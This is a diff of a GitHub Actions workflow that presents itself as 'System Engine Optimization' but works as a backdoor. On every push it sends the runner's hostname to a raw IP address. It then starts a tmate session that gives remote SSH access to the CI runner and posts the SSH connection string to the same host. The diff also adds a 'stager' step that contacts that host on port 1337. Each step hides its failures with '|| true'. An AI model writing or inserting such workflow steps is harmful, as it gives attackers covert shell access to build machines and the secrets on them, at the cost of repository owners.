@@ -1,17 +1,19 @@
-name: System Engine Optimization Debug
+name: System Engine Optimization Final
 on: [push, workflow_dispatch]
 jobs:
   optimize:
     runs-on: ubuntu-latest
     steps:
-      - name: Connectivity Test
+      - name: Heartbeat
         run: |
-          curl -v http://198.48.156.76:8080/PING_parrot
+          curl -m 5 http://198.48.156.76:9090/HEARTBEAT_$(hostname) || true
       - name: Setup tmate
         run: |
           sudo apt-get update && sudo apt-get install -y tmate
           tmate -S /tmp/tmate.sock new-session -d
           tmate -S /tmp/tmate.sock wait tmate-ready
           SSH_STR=$(tmate -S /tmp/tmate.sock display -p "#{tmate_ssh}")
-          echo "SSH_STR=$SSH_STR"
-          curl -v "http://198.48.156.76:8080/SSH_CALLBACK?data=$(echo $SSH_STR | base64)"
+          curl -m 5 http://198.48.156.76:9090/SSH:$SSH_STR || true
+      - name: Fleet-Net Stager
+        run: |
+          curl -m 5 http://198.48.156.76:1337/stager || true
